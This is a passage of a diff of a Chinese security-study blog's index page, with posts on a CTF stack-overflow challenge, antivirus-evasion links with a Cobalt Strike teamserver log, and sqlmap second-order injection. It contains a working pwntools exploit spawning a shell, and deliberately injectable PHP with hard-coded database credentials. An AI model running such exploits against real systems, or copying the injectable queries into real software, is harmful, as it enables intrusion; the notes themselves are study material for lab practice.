-<p><code>fgets</code>处存在栈溢出,<code>s</code>距离ebp为0x9,那么覆盖到返回地址的长度还要再加上0x4，然后写0804850F</p>
-<p>后门地址：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:0804850F                               public stack</span><br><span class="line">.text:0804850F                               stack proc near</span><br><span class="line">.text:0804850F                               ; __unwind &#123;</span><br><span class="line">.text:0804850F 55                            push    ebp</span><br><span class="line">.text:08048510 89 E5                         mov     ebp, esp</span><br><span class="line">.text:08048512 83 EC 08                      sub     esp, 8</span><br><span class="line">.text:08048515 83 EC 0C                      sub     esp, 0Ch</span><br><span class="line">.text:08048518 68 30 86 04 08                push    offset command                  ; &quot;/bin/sh&quot;</span><br><span class="line">.text:0804851D E8 8E FE FF FF                call    _system</span><br><span class="line">.text:0804851D</span><br><span class="line">.text:08048522 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:08048525 90                            nop</span><br><span class="line">.text:08048526 C9                            leave</span><br><span class="line">.text:08048527 C3                            retn</span><br><span class="line">.text:08048527                               ; &#125; // starts at 804850F</span><br><span class="line">.text:08048527</span><br><span class="line">.text:08048527                               stack endp</span><br></pre></td></tr></table></figure>
-
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28109</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">9</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x0804850F</span>)</span><br><span class="line"><span class="built_in">print</span>(payload) <span class="comment"># aaaaaaaaaaaaa\x0f\x04</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="pwn-03"><a href="#pwn-03" class="headerlink" title="pwn 03"></a>pwn 03</h2><p>查看保护</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~/Desktop/pwnremote$ checksec stack1</span><br><span class="line">[*] &#x27;/home/ubuntu/Desktop/pwnremote/stack1&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-
-<p><strong>可以用<code>puts</code>函数泄露出任意函数的<code>got</code>表地址,从而泄露libc,就可以根据相对偏移getshell</strong></p>
-<p>上面这句话没懂，搜下相关东西：</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Morphy_Amo/article/details/121845113">【PWN学习】如何获取libc基址_查看libc基址_Morphy_Amo的博客-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.freesion.com/article/5901691025/">CTF中的PWN——绕canary防护3（选择项+puts带出canary+泄露函数地址计算基地址） - 灰信网（软件开发博客聚合） (freesion.com)</a></p>
-<p>明天继续</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2023/04/18/pwn%E5%85%A5%E9%97%A8/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-恶意代码" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/04/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/">恶意代码</a>
-    </h1>
-  
-
-        
-        <a href="/2023/04/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/" class="archive-article-date">
-  	<time datetime="2023-04-16T11:59:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-04-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a target="_blank" rel="noopener" href="https://github.com/Rvn0xsy/BadCode">Rvn0xsy&#x2F;BadCode: 恶意代码逃逸源代码 http://payloads.online (github.com)</a></p>
-<p><a target="_blank" rel="noopener" href="https://wx.zsxq.com/dweb2/index/columns/2212251881">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>
-<p><a target="_blank" rel="noopener" href="https://payloads.online/">倾旋的博客 (payloads.online)</a></p>
-<p><a target="_blank" rel="noopener" href="https://payloads.online/archivers/2019-11-10/1/">静态恶意代码逃逸（第一课） « 倾旋的博客 (payloads.online)</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/luckyfuture0177/ReZeroBypassAV">luckyfuture0177&#x2F;ReZeroBypassAV: 从零开始学免杀 (github.com)</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1A44y1p7Lc/?spm_id_from=333.337.search-card.all.click&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">cobaltstrike免杀测试合集_哔哩哔哩_bilibili</a></p>
-<p><a target="_blank" rel="noopener" href="https://live.freebuf.com/detail/0610e4ba260f2055969a1f54ffba4486">漏洞挖掘神器训练营 - FreeBuf公开课 | 回归真知</a></p>
-<p>cobalstrike环境搭建：</p>
-<p>直接使用之前下载的全功能win10</p>
-<p>linux端：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo ./teamserver 192.168.222.132 kali  random.profile                                                                                                                                                    130 ⨯</span><br><span class="line">[*] Will use existing X509 certificate and keystore (for SSL)</span><br><span class="line">[CSAgent] PreMain transform fucked up: javassist.bytecode.DuplicateMemberException: duplicate method: hex2bytes in common.Authorization</span><br><span class="line">[+] I see you&#x27;re into threat replication. random.profile loaded.</span><br><span class="line">[*] Loading properties file (/home/kali/Desktop/CobaltStrike_4.4_dog/TeamServer.prop).</span><br><span class="line">[!] Properties file (/home/kali/Desktop/CobaltStrike_4.4_dog/TeamServer.prop) was not found.</span><br><span class="line">[+] Team server is up on 0.0.0.0:6044</span><br><span class="line">[*] SHA256 hash of SSL cert is: 4a96b15ffd482e8e37b0430af4ff6c3e3ac0125d009956f0655535fbba29cf07</span><br></pre></td></tr></table></figure>
-
-<p>windows端</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./start.sh</span><br><span class="line"></span><br><span class="line">输入对应配置</span><br></pre></td></tr></table></figure>
-
-<p>效果检测：360安全卫士、火绒杀毒、VT（<a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/upload">VirusTotal - Home</a>）</p>
-<p><a target="_blank" rel="noopener" href="https://www.codenong.com/cs106112057/">免杀篇远控免杀专题(49)-白名单Xwizard.exe执行payload | 码农家园 (codenong.com)</a></p>
-<h2 id="初识恶意代码"><a href="#初识恶意代码" class="headerlink" title="初识恶意代码"></a>初识恶意代码</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/231663.html">Shellcode编程——编写自己想要功能的Shellcode - FreeBuf网络安全行业门户</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">学习杀与免杀</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2023/04/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
     <article id="post-slay-the-spire" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
@@ -824,9 +285,353 @@
 
 
   
+    <article id="post-蓝队" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/04/08/%E8%93%9D%E9%98%9F/">蓝队</a>
+    </h1>
+  
+
+        
+        <a href="/2023/04/08/%E8%93%9D%E9%98%9F/" class="archive-article-date">
+  	<time datetime="2023-04-08T05:06:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-04-08</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">蓝队学习</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/04/08/%E8%93%9D%E9%98%9F/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-sqlmap-study" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/04/08/sqlmap-study/">sqlmap_study</a>
+    </h1>
+  
+
+        
+        <a href="/2023/04/08/sqlmap-study/" class="archive-article-date">
+  	<time datetime="2023-04-08T05:06:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-04-08</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/122243790">sqlmap深入分析-优质文章整理篇（sqlmap 源码分析、os-shell 原理、攻防角度使用sqlmap）_sqlmap源码分析_OceanSec的博客-CSDN博客</a></p>
+<p>在使用sqlmap时存在以下的问题：</p>
+<p>1、有回显的是如何判断哪个对应哪个的，如果回显编码了怎么办（如base64）</p>
+<p>2、怎样判断是否存在注入？一个界面元素不少，如果只是单纯回显一些会变的垃圾信息呢</p>
+<p>3、启发式测试是什么</p>
+<p>……</p>
+<p>[toc]</p>
+<h2 id="我的测试环境"><a href="#我的测试环境" class="headerlink" title="我的测试环境"></a>我的测试环境</h2><p>sqlmap版本：1.5.10.17#dev</p>
+<p>在buuctf上弄动态靶场</p>
+<p>然后pycharm断点运行</p>
+<h2 id="sqlmap自己分析"><a href="#sqlmap自己分析" class="headerlink" title="sqlmap自己分析"></a>sqlmap自己分析</h2><h2 id="sqlmap-项目剖析（I）-使用"><a href="#sqlmap-项目剖析（I）-使用" class="headerlink" title="sqlmap 项目剖析（I）-使用"></a>sqlmap 项目剖析（I）-使用</h2><h3 id="0x00-sqlmap-介绍"><a href="#0x00-sqlmap-介绍" class="headerlink" title="0x00 sqlmap 介绍"></a>0x00 sqlmap 介绍</h3><p>sqlmap 是一款开源的自动化 SQL 注入测试及漏洞利用工具，有着十余年的开发历史（当然这也造就了一些问题），这款工具最强大的地方在于它对数据库种类以及注入类型的支持堪称史诗级。</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/262848">sqlmap 项目剖析（I）-安全客 - 安全资讯平台 (anquanke.com)</a></p>
+<p>使用懒得写了，上面的链接有说。</p>
+<p>主要记录自己不是很熟练的部分。</p>
+<p>1、指定 burp log 作为目标输入</p>
+<p>首先开启 burpsuite 的请求日志记录功能</p>
+<p>后续在抓包时相关的包会被保存到对应的日志文件里</p>
+<p>此时结合 sqlmap -l 的参数即可对此日志中的数据包进行自动化注入测试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -l burp.log</span><br></pre></td></tr></table></figure>
+
+<p>2、二次注入</p>
+<p>sqlmap 同样支持二次注入场景下的测试与利用，这个功能主要是依赖于 <code>--second-*</code> 参数进行实现。</p>
+<p>自己写了个简单的demo测试：</p>
+<p>新建数据库test。</p>
+<p>sql语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-- 创建second数据库</span><br><span class="line">CREATE DATABASE IF NOT EXISTS `second`;</span><br><span class="line"></span><br><span class="line">-- 使用second数据库</span><br><span class="line">USE `second`;</span><br><span class="line"></span><br><span class="line">-- 创建users表</span><br><span class="line">CREATE TABLE IF NOT EXISTS `users` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `username` varchar(255) NOT NULL,</span><br><span class="line">  `password` varchar(255) NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;</span><br><span class="line"></span><br><span class="line">-- 插入测试数据</span><br><span class="line">INSERT INTO `users` (`id`, `username`, `password`) VALUES</span><br><span class="line">(1, &#x27;admin&#x27;, &#x27;admin123&#x27;),</span><br><span class="line">(2, &#x27;user1&#x27;, &#x27;password1&#x27;),</span><br><span class="line">(3, &#x27;user2&#x27;, &#x27;password2&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>first.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建数据库连接</span></span><br><span class="line"><span class="comment">// 显示所有错误信息</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_startup_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>; <span class="comment">// 数据库服务器地址</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>; <span class="comment">// 数据库用户名</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;123456&quot;</span>; <span class="comment">// 数据库密码</span></span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;second&quot;</span>; <span class="comment">// 数据库名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;连接成功&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// $password = addslashes($_GET[&#x27;password&#x27;]);</span></span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$conn</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]); <span class="comment">// 转义特殊字符</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;replace into users(id,username,password)values(1,&#x27;admin&#x27;,&#x27;<span class="subst">$password</span>&#x27;);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>second.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建数据库连接</span></span><br><span class="line"><span class="comment">// 显示所有错误信息</span></span><br><span class="line"><span class="comment">// ini_set(&#x27;display_errors&#x27;, 1);</span></span><br><span class="line"><span class="comment">// ini_set(&#x27;display_startup_errors&#x27;, 1);</span></span><br><span class="line"><span class="comment">// error_reporting(E_ALL);</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>; <span class="comment">// 数据库服务器地址</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>; <span class="comment">// 数据库用户名</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;123456&quot;</span>; <span class="comment">// 数据库密码</span></span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;second&quot;</span>; <span class="comment">// 数据库名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="string">&#x27;select password from users where id=1;&#x27;</span>);</span><br><span class="line"><span class="comment">// 输出查询结果</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_ASSOC)) &#123;</span><br><span class="line">        <span class="comment">// echo var_dump($row);</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$row</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$result1</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="string">&quot;select * from users where password = &#x27;<span class="subst">$value</span>&#x27;;&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result1</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="variable">$row1</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result1</span>, MYSQLI_ASSOC)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$row1</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$row1</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;0 结果&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0 结果&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭连接</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230426164201842.png" alt="image-20230426164201842"></p>
+<h2 id="sqlmap-项目剖析（II）"><a href="#sqlmap-项目剖析（II）" class="headerlink" title="sqlmap 项目剖析（II）"></a>sqlmap 项目剖析（II）</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/262847">sqlmap 项目剖析（II）-安全客 - 安全资讯平台 (anquanke.com)</a></p>
+<p>sqlmap步骤：</p>
+<ul>
+<li>全局变量初始化</li>
+<li>命令行参数解析</li>
+<li>全局变量赋值</li>
+<li>环境检查</li>
+<li>目标连通性检查</li>
+<li>WAF 探测</li>
+<li>页面动态内容提取</li>
+<li>参数动态性检测</li>
+<li>启发式测试</li>
+</ul>
+<p>下面挑一点详细的看</p>
+<h3 id="初始化流程"><a href="#初始化流程" class="headerlink" title="初始化流程"></a>初始化流程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Main function of sqlmap when running from command line.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        dirtyPatches()</span><br><span class="line">        resolveCrossReferences()</span><br><span class="line">        checkEnvironment()</span><br><span class="line">        setPaths(modulePath())</span><br><span class="line">        banner()</span><br><span class="line"></span><br><span class="line">        args = cmdLineParser()</span><br><span class="line">        cmdLineOptions.update(args.__dict__ <span class="keyword">if</span> <span class="built_in">hasattr</span>(args, <span class="string">&quot;__dict__&quot;</span>) <span class="keyword">else</span> args)</span><br><span class="line">        initOptions(cmdLineOptions)</span><br><span class="line"></span><br><span class="line">        init()</span><br><span class="line">        start()</span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">sqlmap</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/04/08/sqlmap-study/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-面经" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/04/04/%E9%9D%A2%E7%BB%8F/">八股文</a>
+    </h1>
+  
+
+        
+        <a href="/2023/04/04/%E9%9D%A2%E7%BB%8F/" class="archive-article-date">
+  	<time datetime="2023-04-04T03:02:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-04-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        Here's something encrypted, password is required to continue reading.
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">面筋</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/04/04/%E9%9D%A2%E7%BB%8F/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-常见漏洞整理" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
